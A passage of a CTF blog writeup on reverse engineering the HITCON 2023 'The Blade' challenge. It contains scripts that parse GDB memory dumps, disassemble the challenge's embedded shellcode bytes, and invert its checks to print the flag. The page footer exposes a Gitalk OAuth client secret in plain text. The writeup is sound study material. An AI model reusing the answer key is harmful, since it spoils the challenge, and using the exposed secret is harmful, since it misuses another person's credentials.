0x22    0xbf    0x26    0x84    0x0d    0x90    0xa3</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xae    0x3d    0x1d    0xc8    0x91    0x05    0x87    0x70</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x08    0x73    0x21    0x49    0x55    0x3e    0x37    0x23</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x18    0x56    0xce    0x82    0x38    0x95    0x78    0xf8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_memory_dump</span>(<span class="params">dump</span>):</span><br><span class="line">    bytes_array = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dump.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        parts = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        byte_strs = parts[<span class="number">1</span>].split()</span><br><span class="line">        <span class="keyword">for</span> byte_str <span class="keyword">in</span> byte_strs:</span><br><span class="line">            bytes_array.append(<span class="built_in">int</span>(byte_str.strip(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> bytes_array</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parsing plain and encrypted strings</span></span><br><span class="line">plain_bytes = parse_memory_dump(plain_string)</span><br><span class="line">encrypted_bytes = parse_memory_dump(encrypted_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating a decryption map from encrypted bytes to plain bytes</span></span><br><span class="line">decryption_map = &#123;encrypted: plain <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decryption Map: &quot;</span>, decryption_map)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== Part 3: Parsing the shellcode =====</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> disasm</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span></span><br><span class="line"><span class="string">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span></span><br><span class="line"><span class="string">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span></span><br><span class="line"><span class="string">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span></span><br><span class="line"><span class="string">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span></span><br><span class="line"><span class="string">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span></span><br><span class="line"><span class="string">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span></span><br><span class="line"><span class="string">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span></span><br><span class="line"><span class="string">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span></span><br><span class="line"><span class="string">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span></span><br><span class="line"><span class="string">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span></span><br><span class="line"><span class="string">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span></span><br><span class="line"><span class="string">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span></span><br><span class="line"><span class="string">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span></span><br><span class="line"><span class="string">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span></span><br><span class="line"><span class="string">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span></span><br><span class="line"><span class="string">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span></span><br><span class="line"><span class="string">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span></span><br><span class="line"><span class="string">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span></span><br><span class="line"><span class="string">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span></span><br><span class="line"><span class="string">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span></span><br><span class="line"><span class="string">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span></span><br><span class="line"><span class="string">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_bytes = parse_memory_dump(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disassemble the shellcode bytes for the amd64 architecture</span></span><br><span class="line">disassembled_code = disasm(shellcode_bytes, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the disassembled code for review</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Disassembled_code: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(disassembled_code)</span><br><span class="line"><span class="built_in">print</span>()  <span class="comment"># Adds a blank line for better readability</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the shellcode bytes back into a string format for display or other uses</span></span><br><span class="line">shellcode_exe = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;\\x&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> shellcode_bytes])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the shellcode string in a format that&#x27;s ready to be used or analyzed</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode: &quot;</span>, shellcode_exe)</span><br></pre></td></tr></table></figure></div></li>
+<li>exploit.py<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">index_map = [<span class="number">61</span>, <span class="number">46</span>, <span class="number">51</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">38</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">28</span>, <span class="number">14</span>, <span class="number">42</span>, <span class="number">48</span>, <span class="number">3</span>, <span class="number">63</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">43</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">32</span>, <span class="number">59</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">49</span>, <span class="number">25</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">47</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">60</span>, <span class="number">9</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">decrypt_map = &#123;<span class="number">251</span>: <span class="number">0</span>, <span class="number">123</span>: <span class="number">1</span>, <span class="number">78</span>: <span class="number">2</span>, <span class="number">187</span>: <span class="number">3</span>, <span class="number">81</span>: <span class="number">4</span>, <span class="number">21</span>: <span class="number">5</span>, <span class="number">141</span>: <span class="number">6</span>, <span class="number">219</span>: <span class="number">7</span>, <span class="number">176</span>: <span class="number">8</span>, <span class="number">172</span>: <span class="number">9</span>, <span class="number">165</span>: <span class="number">10</span>, <span class="number">142</span>: <span class="number">11</span>, <span class="number">170</span>: <span class="number">12</span>, <span class="number">178</span>: <span class="number">13</span>, <span class="number">96</span>: <span class="number">14</span>, <span class="number">235</span>: <span class="number">15</span>, <span class="number">99</span>: <span class="number">16</span>, <span class="number">92</span>: <span class="number">17</span>, <span class="number">222</span>: <span class="number">18</span>, <span class="number">66</span>: <span class="number">19</span>, <span class="number">43</span>: <span class="number">20</span>, <span class="number">198</span>: <span class="number">21</span>, <span class="number">166</span>: <span class="number">22</span>, <span class="number">53</span>: <span class="number">23</span>, <span class="number">48</span>: <span class="number">24</span>, <span class="number">67</span>: <span class="number">25</span>, <span class="number">214</span>: <span class="number">26</span>, <span class="number">95</span>: <span class="number">27</span>, <span class="number">189</span>: <span class="number">28</span>, <span class="number">36</span>: <span class="number">29</span>, <span class="number">177</span>: <span class="number">30</span>, <span class="number">227</span>: <span class="number">31</span>, <span class="number">140</span>: <span class="number">32</span>, <span class="number">167</span>: <span class="number">33</span>, <span class="number">213</span>: <span class="number">34</span>, <span class="number">42</span>: <span class="number">35</span>, <span class="number">124</span>: <span class="number">36</span>, <span class="number">109</span>: <span class="number">37</span>, <span class="number">139</span>: <span class="number">38</span>, <span class="number">23</span>: <span class="number">39</span>, <span class="number">157</span>: <span class="number">40</span>, <span class="number">131</span>: <span class="number">41</span>, <span class="number">254</span>: <span class="number">42</span>, <span class="number">105</span>: <span class="number">43</span>, <span class="number">16</span>: <span class="number">44</span>, <span class="number">89</span>: <span class="number">45</span>, <span class="number">169</span>: <span class="number">46</span>, <span class="number">158</span>: <span class="number">47</span>, <span class="number">15</span>: <span class="number">48</span>, <span class="number">28</span>: <span class="number">49</span>, <span class="number">102</span>: <span class="number">50</span>, <span class="number">151</span>: <span class="number">51</span>, <span class="number">91</span>: <span class="number">52</span>, <span class="number">97</span>: <span class="number">53</span>, <span class="number">237</span>: <span class="number">54</span>, <span class="number">173</span>: <span class="number">55</span>, <span class="number">224</span>: <span class="number">56</span>, <span class="number">218</span>: <span class="number">57</span>, <span class="number">39</span>: <span class="number">58</span>, <span class="number">6</span>: <span class="number">59</span>, <span class="number">37</span>: <span class="number">60</span>, <span class="number">220</span>: <span class="number">61</span>, <span class="number">94</span>: <span class="number">62</span>, <span class="number">231</span>: <span class="number">63</span>, <span class="number">65</span>: <span class="number">64</span>, <span class="number">50</span>: <span class="number">65</span>, <span class="number">210</span>: <span class="number">66</span>, <span class="number">217</span>: <span class="number">67</span>, <span class="number">143</span>: <span class="number">68</span>, <span class="number">238</span>: <span class="number">69</span>, <span class="number">175</span>: <span class="number">70</span>, <span class="number">3</span>: <span class="number">71</span>, <span class="number">147</span>: <span class="number">72</span>, <span class="number">58</span>: <span class="number">73</span>, <span class="number">0</span>: <span class="number">74</span>, <span class="number">162</span>: <span class="number">75</span>, <span class="number">225</span>: <span class="number">76</span>, <span class="number">179</span>: <span class="number">77</span>, <span class="number">236</span>: <span class="number">78</span>, <span class="number">129</span>: <span class="number">79</span>, <span class="number">159</span>: <span class="number">80</span>, <span class="number">202</span>: <span class="number">81</span>, <span class="number">88</span>: <span class="number">82</span>, <span class="number">183</span>: <span class="number">83</span>, <span class="number">121</span>: <span class="number">84</span>, <span class="number">253</span>: <span class="number">85</span>, <span class="number">59</span>: <span class="number">86</span>, <span class="number">160</span>: <span class="number">87</span>, <span class="number">2</span>: <span class="number">88</span>, <span class="number">12</span>: <span class="number">89</span>, <span class="number">203</span>: <span class="number">90</span>, <span class="number">168</span>: <span class="number">91</span>, <span class="number">128</span>: <span class="number">92</span>, <span class="number">192</span>: <span class="number">93</span>, <span class="number">22</span>: <span class="number">94</span>, <span class="number">77</span>: <span class="number">95</span>, <span class="number">47</span>: <span class="number">96</span>, <span class="number">117</span>: <span class="number">97</span>, <span class="number">113</span>: <span class="number">98</span>, <span class="number">10</span>: <span class="number">99</span>, <span class="number">4</span>: <span class="number">100</span>, <span class="number">57</span>: <span class="number">101</span>, <span class="number">255</span>: <span class="number">102</span>, <span class="number">193</span>: <span class="number">103</span>, <span class="number">156</span>: <span class="number">104</span>, <span class="number">171</span>: <span class="number">105</span>, <span class="number">239</span>: <span class="number">106</span>, <span class="number">164</span>: <span class="number">107</span>, <span class="number">216</span>: <span class="number">108</span>, <span class="number">226</span>: <span class="number">109</span>, <span class="number">20</span>: <span class="number">110</span>, <span class="number">194</span>: <span class="number">111</span>, <span class="number">108</span>: <span class="number">112</span>, <span class="number">100</span>: <span class="number">113</span>, <span class="number">30</span>: <span class="number">114</span>, <span class="number">107</span>: <span class="number">115</span>, <span class="number">126</span>: <span class="number">116</span>, <span class="number">153</span>: <span class="number">117</span>, <span class="number">46</span>: <span class="number">118</span>, <span class="number">9</span>: <span class="number">119</span>, <span class="number">11</span>: <span class="number">120</span>, <span class="number">134</span>: <span class="number">121</span>, <span class="number">116</span>: <span class="number">122</span>, <span class="number">106</span>: <span class="number">123</span>, <span class="number">196</span>: <span class="number">124</span>, <span class="number">45</span>: <span class="number">125</span>, <span class="number">79</span>: <span class="number">126</span>, <span class="number">249</span>: <span class="number">127</span>, <span class="number">250</span>: <span class="number">128</span>, <span class="number">148</span>: <span class="number">129</span>, <span class="number">182</span>: <span class="number">130</span>, <span class="number">31</span>: <span class="number">131</span>, <span class="number">137</span>: <span class="number">132</span>, <span class="number">111</span>: <span class="number">133</span>, <span class="number">93</span>: <span class="number">134</span>, <span class="number">232</span>: <span class="number">135</span>, <span class="number">234</span>: <span class="number">136</span>, <span class="number">181</span>: <span class="number">137</span>, <span class="number">90</span>: <span class="number">138</span>, <span class="number">101</span>: <span class="number">139</span>, <span class="number">136</span>: <span class="number">140</span>, <span class="number">197</span>: <span class="number">141</span>, <span class="number">127</span>: <span class="number">142</span>, <span class="number">119</span>: <span class="number">143</span>, <span class="number">17</span>: <span class="number">144</span>, <span class="number">207</span>: <span class="number">145</span>, <span class="number">241</span>: <span class="number">146</span>, <span class="number">27</span>: <span class="number">147</span>, <span class="number">63</span>: <span class="number">148</span>, <span class="number">244</span>: <span class="number">149</span>, <span class="number">72</span>: <span class="number">150</span>, <span class="number">71</span>: <span class="number">151</span>, <span class="number">18</span>: <span class="number">152</span>, <span class="number">228</span>: <span class="number">153</span>, <span class="number">186</span>: <span class="number">154</span>, <span class="number">223</span>: <span class="number">155</span>, <span class="number">233</span>: <span class="number">156</span>, <span class="number">98</span>: <span class="number">157</span>, <span class="number">110</span>: <span class="number">158</span>, <span class="number">180</span>: <span class="number">159</span>, <span class="number">150</span>: <span class="number">160</span>, <span class="number">205</span>: <span class="number">161</span>, <span class="number">19</span>: <span class="number">162</span>, <span class="number">83</span>: <span class="number">163</span>, <span class="number">75</span>: <span class="number">164</span>, <span class="number">40</span>: <span class="number">165</span>, <span class="number">215</span>: <span class="number">166</span>, <span class="number">209</span>: <span class="number">167</span>, <span class="number">51</span>: <span class="number">168</span>, <span class="number">184</span>: <span class="number">169</span>, <span class="number">230</span>: <span class="number">170</span>, <span class="number">122</span>: <span class="number">171</span>, <span class="number">44</span>: <span class="number">172</span>, <span class="number">155</span>: <span class="number">173</span>, <span class="number">41</span>: <span class="number">174</span>, <span class="number">68</span>: <span class="number">175</span>, <span class="number">82</span>: <span class="number">176</span>, <span class="number">247</span>: <span class="number">177</span>, <span class="number">32</span>: <span class="number">178</span>, <span class="number">242</span>: <span class="number">179</span>, <span class="number">49</span>: <span class="number">180</span>, <span class="number">211</span>: <span class="number">181</span>, <span class="number">185</span>: <span class="number">182</span>, <span class="number">64</span>: <span class="number">183</span>, <span class="number">208</span>: <span class="number">184</span>, <span class="number">52</span>: <span class="number">185</span>, <span class="number">245</span>: <span class="number">186</span>, <span class="number">84</span>: <span class="number">187</span>, <span class="number">26</span>: <span class="number">188</span>, <span class="number">1</span>: <span class="number">189</span>, <span class="number">161</span>: <span class="number">190</span>, <span class="number">146</span>: <span class="number">191</span>, <span class="number">252</span>: <span class="number">192</span>, <span class="number">133</span>: <span class="number">193</span>, <span class="number">7</span>: <span class="number">194</span>, <span class="number">190</span>: <span class="number">195</span>, <span class="number">221</span>: <span class="number">196</span>, <span class="number">188</span>: <span class="number">197</span>, <span class="number">25</span>: <span class="number">198</span>, <span class="number">243</span>: <span class="number">199</span>, <span class="number">54</span>: <span class="number">200</span>, <span class="number">246</span>: <span class="number">201</span>, <span class="number">114</span>: <span class="number">202</span>, <span class="number">152</span>: <span class="number">203</span>, <span class="number">76</span>: <span class="number">204</span>, <span class="number">125</span>: <span class="number">205</span>, <span class="number">199</span>: <span class="number">206</span>, <span class="number">212</span>: <span class="number">207</span>, <span class="number">69</span>: <span class="number">208</span>, <span class="number">74</span>: <span class="number">209</span>, <span class="number">154</span>: <span class="number">210</span>, <span class="number">195</span>: <span class="number">211</span>, <span class="number">138</span>: <span class="number">212</span>, <span class="number">229</span>: <span class="number">213</span>, <span class="number">80</span>: <span class="number">214</span>, <span class="number">70</span>: <span class="number">215</span>, <span class="number">204</span>: <span class="number">216</span>, <span class="number">104</span>: <span class="number">217</span>, <span class="number">118</span>: <span class="number">218</span>, <span class="number">103</span>: <span class="number">219</span>, <span class="number">201</span>: <span class="number">220</span>, <span class="number">14</span>: <span class="number">221</span>, <span class="number">60</span>: <span class="number">222</span>, <span class="number">87</span>: <span class="number">223</span>, <span class="number">240</span>: <span class="number">224</span>, <span class="number">34</span>: <span class="number">225</span>, <span class="number">191</span>: <span class="number">226</span>, <span class="number">38</span>: <span class="number">227</span>, <span class="number">132</span>: <span class="number">228</span>, <span class="number">13</span>: <span class="number">229</span>, <span class="number">144</span>: <span class="number">230</span>, <span class="number">163</span>: <span class="number">231</span>, <span class="number">174</span>: <span class="number">232</span>, <span class="number">61</span>: <span class="number">233</span>, <span class="number">29</span>: <span class="number">234</span>, <span class="number">200</span>: <span class="number">235</span>, <span class="number">145</span>: <span class="number">236</span>, <span class="number">5</span>: <span class="number">237</span>, <span class="number">135</span>: <span class="number">238</span>, <span class="number">112</span>: <span class="number">239</span>, <span class="number">8</span>: <span class="number">240</span>, <span class="number">115</span>: <span class="number">241</span>, <span class="number">33</span>: <span class="number">242</span>, <span class="number">73</span>: <span class="number">243</span>, <span class="number">85</span>: <span class="number">244</span>, <span class="number">62</span>: <span class="number">245</span>, <span class="number">55</span>: <span class="number">246</span>, <span class="number">35</span>: <span class="number">247</span>, <span class="number">24</span>: <span class="number">248</span>, <span class="number">86</span>: <span class="number">249</span>, <span class="number">206</span>: <span class="number">250</span>, <span class="number">130</span>: <span class="number">251</span>, <span class="number">56</span>: <span class="number">252</span>, <span class="number">149</span>: <span class="number">253</span>, <span class="number">120</span>: <span class="number">254</span>, <span class="number">248</span>: <span class="number">255</span>&#125;</span><br><span class="line"></span><br><span class="line">const_data = [<span class="number">0x526851A7</span>, <span class="number">0x31FF2785</span>, <span class="number">0xC7D28788</span>, <span class="number">0x523F23D3</span>, <span class="number">0xAF1F1055</span>, <span class="number">0x5C94F027</span>, <span class="number">0x797A3FCD</span>, <span class="number">0xE7F02F9F</span>, <span class="number">0x3C86F045</span>, <span class="number">0x6DEAB0F9</span>, <span class="number">0x91F74290</span>, <span class="number">0x7C9A3AED</span>, <span class="number">0xDC846B01</span>, <span class="number">0x0743C86C</span>, <span class="number">0xDFF7085C</span>, <span class="number">0xA4AEE3EB</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_cal</span>(<span class="params">x</span>):</span><br><span class="line">    r12 = <span class="number">0x0000000464C457F</span></span><br><span class="line">    r13 = <span class="number">0x0000000746F6F72</span></span><br><span class="line">    r14 = <span class="number">0x000000031F3831F</span></span><br><span class="line"></span><br><span class="line">    x = np.uint32(x)</span><br><span class="line">    x = np.uint32(x ^ r14)</span><br><span class="line">    x = np.uint32(~x)</span><br><span class="line">    x = np.uint32((x &lt;&lt; <span class="number">11</span>) | (x &gt;&gt; (<span class="number">32</span> - <span class="number">11</span>)))</span><br><span class="line">    x = np.uint32(x ^ r13)</span><br><span class="line">    x = np.uint32(x - r12)</span><br><span class="line">    x = np.int32(x)</span><br><span class="line">    <span class="keyword">return</span> [x &amp; <span class="number">0xff</span>, (x &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>, (x &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>, (x &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> const_data:</span><br><span class="line">    flag_list.extend(reverse_cal(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    flag_list = [decrypt_map[i] <span class="keyword">for</span> i <span class="keyword">in</span> flag_list]</span><br><span class="line">    flag_list = [flag_list[index_map[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag_list)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div></li>
+<li>flag:<br><code>hitcon&#123;&lt;https://soundcloud.com/monstercat/noisestorm-crab-rave&gt;&#125;</code><br>flag 是一串網址，感覺有點像是迷因 XD，有興趣可以去聽看看～</li>
+</ul>
+<h2 id="0x5-Summary"><a href="#0x5-Summary" class="headerlink" title="0x5 Summary"></a>0x5 Summary</h2><ul>
+<li><p>找指令的不同思路：<br>這題在分析的思路上算是蠻線性的，基本上要分析的也只有 <code>verify()</code> 跟一點點 <code>prompt()</code>，不過看到有其他高手用 <code>strings</code> 直接找到 flag-checker 的指令很不可思議，下次也會從這邊切入嘗試，也許能省下不少時間。</p>
+</li>
+<li><p>敗筆：<br><code>verify()</code> 前面處理 input 的部分從靜態分析都能夠大概看出來，但後面寫入 255 bytes 的 shellcode 沒有意識到，雖然有發現寫入了一些 bytes 但沒有轉成 assembly 就很難猜到他後面在幹嘛，不過有經驗後下次就會把這個可能考慮進去，解出來後面就蠻順利了。</p>
+</li>
+<li><p>發現好用的新工具：<br>在建立加密映射表的時候覺得輸入的重複性很高，就查了一下 GDB 有 python API 可以用，未來感覺也可以應用在不少場境。</p>
+</li>
+</ul>
+<h2 id="0x6-References"><a href="#0x6-References" class="headerlink" title="0x6 References"></a>0x6 References</h2><p><a class="link"   target="_blank" rel="noopener" href="https://trebledj.me/posts/hitcon-2023-the-blade/" >HITCON 2023 – The Blade <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Sky_WF/article/details/132796329" >hitcon2023逆向 The Blade WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://hexrotor.github.io/2023/09/10/hitcon-2023-blade-wp/" >Hitcon 2023 Blade WP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> HITCON-CTF-2023 Full Chain - The Blade Writeup</li>
+        <li><strong>Author:</strong> kazma</li>
+        <li><strong>Created at
+                :</strong> 2024-02-19 01:44:30</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-02-28 22:14:45
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kazma.tw/2024/02/19/HITCON-CTF-2023-Full-Chain-The-Blade-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/reverse/">#reverse</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/writeup/">#writeup</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/hitconctf/">#hitconctf</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/02/11/Pwnable-tw-calc-Writeup/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Pwnable.tw calc Writeup</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '68fd7e0e6c37358fbb4f',
+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">HITCON-CTF-2023 Full Chain - The Blade Writeup</div>
